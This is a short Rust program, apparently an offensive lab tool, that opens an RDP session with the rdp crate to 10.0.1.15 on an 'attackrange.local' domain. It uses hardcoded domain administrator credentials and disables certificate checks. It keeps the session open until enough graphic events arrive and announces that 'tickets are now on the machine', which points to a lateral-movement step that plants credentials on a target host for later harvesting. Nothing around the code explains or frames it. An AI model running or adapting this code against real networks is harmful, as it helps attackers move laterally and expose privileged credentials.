extern crate rdp;

use std::net::TcpStream;
use rdp::core::client::Connector;

fn main() {
    let tcp = TcpStream::connect("10.0.1.15:3389").unwrap();

    let mut rdp_connector = Connector::new()
        .credentials("attackrange.local".to_string(), "DomainAdministrator".to_string(), "P@ssw0rd!".to_string())
        .check_certificate(false)
        .use_nla(true);

    // RDP connection

    match rdp_connector.connect(tcp) {
        Err(e) => println!("[!] {:?}", e),
        Ok(mut c) => {
            println!("[*] Connected !");
            loop {
                let mut nb_event_received = 0;
                c.read(|e| {
                    match e {
                        _ => {
                            nb_event_received = nb_event_received + 1;
                        }
                    }
                });
                if nb_event_received > 20 {
                    println!("[*] Received enough graphic events => ticket are now on the machine !");
                    break;
                }
            }
        }
    }
}